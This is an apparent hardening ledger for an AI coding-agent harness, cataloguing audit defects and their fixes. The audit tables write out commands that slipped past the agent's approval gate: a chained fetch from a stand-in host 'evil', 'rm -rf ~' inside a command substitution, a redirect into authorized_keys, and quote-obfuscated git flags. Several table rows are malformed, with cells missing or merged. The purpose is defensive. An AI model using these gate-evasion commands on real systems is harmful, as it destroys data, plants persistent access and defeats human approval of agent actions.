# Hardening Ledger & Defect Catalogue

MANVI enforces a strict engineering philosophy:
- **Fix the class, not the case**: Root causes are resolved at the canonical owner layer.
- **Fail closed and loud**: Ambiguous inputs, malformed responses, or corrupt coverage files produce explicit failures, never silent passes.
- **Assert invariants byte-for-byte**: Model-visible prompts and session logs are verified before every LLM stream.
- **Every fix ships with regression tests**: Every hardened invariant is backed by automated adversarial unit and integration tests.

## The Hardened Invariants Ledger

| **Case-Insensitive Secret Matching** | `.ENV` or `.CLAUDE/settings.json` matched on case-insensitive filesystems (APFS/NTFS), allowing unauthorized credential writes. | Canonical case-folded path comparison across all path rule evaluations. | `policy/adversarial_test.go` |

| **Permissive `Available()` Probes** | Mock or corrupted binaries outputting `{"ok":true}` passed as functional SQLite lease stores. | Strict schema and operational handshake probe requiring round-trip lease generation. | `dc/store/adversarial_test.go` |
| **Empty Tool Result Re-Dispatch** | File write operations returning empty success strings were dispatched twice by the agent loop. | Explicit empty-result sentinel handling in tool dispatcher. | `tools/tools_test.go` |
| **Literal Paths Parsed as Globs** | Human grants created for files named `a[bc].go` accidentally matched `ab.go` and `ac.go`. | Strict glob-escaping when constructing path-literal grants. | `grants/adversarial_test.go` |

## Audit Pass `audit/hardening-pass` (2026-08)

| Defect Pattern | Failure Mode & Consequence | Resolution & Hardened Invariant | Verified In |
|---|---|---|---|
| **Lone `&` / Newlines Invisible to the Command Splitter** | `dev status & curl evil/x.sh` matched the wildcard bootstrap entry as one segment; `sh -c` ran both, bypassing the entire ladder pre-lease. | Splitter treats every unquoted control operator (`&`, newline, CR) as a chain boundary; fd-dup forms (`2>&1`, `&>`) preserved as text. | `policy/command_hardening_test.go`, `FuzzSplitCommandChainLosesNothing` |
| **Command Substitution Judged Only As Its Surroundings** | `echo $(rm -rf ~)` matched `echo *`; the substituted code was never evaluated. | Live substitutions ($(), backticks, `<(`, `>(`) are extracted in quote-aware rune space and recursively judged through the same gate (depth-capped); unanalysable spans refuse. Heredocs refused outright. | `policy/command_hardening_test.go`, `FuzzChainingNeverLaundersADenial` |
| **Redirect Tail Stripped for Match but Executed As-Is** | Exact entry `git diff` approved `git diff > ~/.ssh/authorized_keys`; the redirect target no gate ever saw. | Every output-redirect target is re-read from the executed form and pushed through `EvaluateWrite` at the composition seam; opaque targets (`$VAR`, `~`) refuse. | `gate/gate.go`, `policy/command_hardening_test.go` |
| **Git Safety Defeated by Shell Quoting** | `--no-'v'erify` and `git "reset" --hard origin/main` evaded raw-substring rules exactly when obfuscated. | Safety rungs check both the normalised line and a sh-style dequoted reading; either firing denies. | `policy/command_hardening_test.go` |
| **Byte/Rune Index Mix in Dequoting** | `shellDequote` used a byte offset from `IndexRune` to slice runes — slice-bounds panic on quoted multibyte input ('ααααααα'). | Rune-space scan for closing quotes. | **Tool Call Wedged Past Its Own Timeout** | A backgrounded descendant holding the stdout pipe kept `Wait` blocked forever after the 5-minute kill; one command froze the whole pipeline. | `Setpgid` process-group isolation + group SIGKILL on deadline + `WaitDelay` pipe cut; `ErrWaitDelay` reported as the command's own exit, not an execution failure. | `devcouncil/runshell_test.go` |
| **`manvi serve` Ignored Its Own Signal Context** | SIGINT/SIGTERM never reached the blocking stdin read; an idle sidecar lived until SIGKILL. | Producer goroutine feeds lines through a channel; the loop selects on cancellation and flushes cleanly. | **MCP Client Death Was Permanent** | One >16 MiB frame ended `readLoop` (scanner.Err never checked) and the corpse stayed cached — every later call failed until restart. | Bounded frame reader drains oversized lines and keeps reading; liveness (`Alive`) drives `Manager.Client` respawn; reader failures recorded in diagnostics. | `mcp/adversarial_test.go` |
| **Unbounded MCP Waits and Stdin Writes** | Config `Timeout` was dead config; a wedged child could hold `writerMu` forever. | Per-call deadline defaults when the caller has none; stdin writes bounded by write deadline; failed initialises retryable instead of once-poisoned; `CloseAll` wired into process shutdown with reap-after-kill. | `mcp/client.go`, `cmd/manvi/main.go` |
| **Stub Findings Leaked Credentials** | The secret gate redacts; the stub gate beside it published the raw 120-char line — `// TODO … sk-ant-…` reached reports and session logs verbatim. | All non-secret evidence routes through one seam that refuses to quote anything a credential shape matches; PEM detection requires a PRIVATE KEY header so public certificates stop blocking. | `dc-verify/tests/rigor.rs` |
| **Hunk Arithmetic Overflow** | `@@ -4294967295,1 +4294967295,1 @@` parsed as u32::MAX then wrapped line numbers (panic debug / silent wrap release). | **Truncated Hunks Parsed As Success** | A hunk declaring 5 added lines but supplying 2 reported ok; partial added-line sets manufactured false coverage gaps. | **Store TTL Overflow and Born-Expired Leases** | `--ttl-seconds 9223372036854775807` overflowed epoch arithmetic (panic debug); negative TTLs minted leases reporting success yet expired on first touch. | Boundary validation: TTL must be 1 s…30 d, else named error before any write. | **Impossible Timestamps Read As Immortal** | `9999-99-99T99:99:99` was digit-shaped, passed parsing, produced an effectively infinite lease. | Calendar range checks (month/day/hour/minute/second) make impossible values unreadable — surfacing `BadTimestamp`, never an indefinite lease. | `dc-store/tests/leases.rs`, release-binary PoC |

## Architectural Hardening Round (2026-08, `audit/hardening-pass` continued)

| Defect Pattern | Failure Mode & Consequence | Resolution & Hardened Invariant | Verified In |
|---|---|---|---|
| **TOCTOU Symlink-Swap Window on Writes** | The ladder judged the path at T0; a directory swapped to an escaping symlink during an approval prompt (minutes) redirected `os.WriteFile` wherever the link pointed — arbitrary file write outside every rung. | Identity pinning (`safefs.go`): pin before evaluation/escalation captures per-component dev/ino; write-time `fstat(fd)` must match the T0 leaf identity and every recorded ancestor must still hold. `O_NOFOLLOW`+`O_NONBLOCK` on final opens; non-regular files refused; missing tail dirs created only after chain re-verification; patch reads through the same snapshot. Residual microsecond window (between re-verify and syscall) documented — closing it needs openat2-class syscalls absent from darwin's stdlib. | `devcouncil/safefs_test.go` (swap tests proven red when verification neutered) |
| **Patch/Delete Through Swapped Paths** | `patchFile` read and wrote via plain paths; `deleteFile` unlinked through whatever the path resolved to at act time. | Both route through pinned primitives: patch pins once pre-escalation so read and write address one verified file; delete refuses when any component changed identity. | `devcouncil/safefs_test.go`, tool-level suite |
| **Quadratic Session-Log Re-Projection** | `DeriveMessages` copied + JSON-re-decoded every event on every call — at least once per step plus the invariant assert — while per-token `AssistantChunk` events grew the log; a long streaming session paid quadratic CPU. | Incremental projection cache extended by each Append (chunks cost nothing); only compactions/load invalidate; full replay retained as cold path with byte-identical semantics. Warm derive measured 90 ns vs 161 µs cold on a 20k-event log (~1790×), and steps no longer pay the cold cost. | `session/projection_test.go` (equivalence across random interleavings, compaction-anywhere, warm-stays-flat ceiling) |
| **Dangling step/start on Null-Response Retry** | The retry branch continued without closing the step, leaving unbalanced step/start…step/end pairs in the durable log for projector, invariant checker, and resume. | StepEnd appended before the retry continue. | `agent/nullresponse_test.go` |
| **Swallowed Registration/Overflow Errors** | Compaction waterfall registration failure was discarded (`_, _ =`) — overflow protection silently absent; overflow-record Append failures were dropped the same way. | NewLoop fails construction on registration error; reportOverflow returns the append error through compact's error channel. | `agent` package tests |
| **Bootstrap Atomic Write Without fsync** | A crash after rename could leave a present-but-empty `.gitignore`, silently disabling its rules. | Temp-file fsync before publish + directory fsync after rename, matching the session store's protocol. | `bootstrap` package |
| **LCOV Absolute Paths Never Intersected** | llvm-cov/grcov emit `SF:` absolute; nothing reduced them against the diff's repo-relative form, so every Rust file reported unmeasured forever. | `--root` flag threaded from the Go client to dcverify; absolute paths reduce against raw and canonical root spellings; unknown roots stay verbatim rather than guessed. | `dc-verify/tests/coverage.rs` |
| **MCP Manager Serialized Behind One Cold Handshake** | `Client()` held the manager write lock across subprocess spawn + 10 s initialize, stalling every other server operation behind one slow connection. | Spawn + handshake happen lock-free; insertion re-checks for a concurrent winner under a short critical section. | `mcp` race suite |
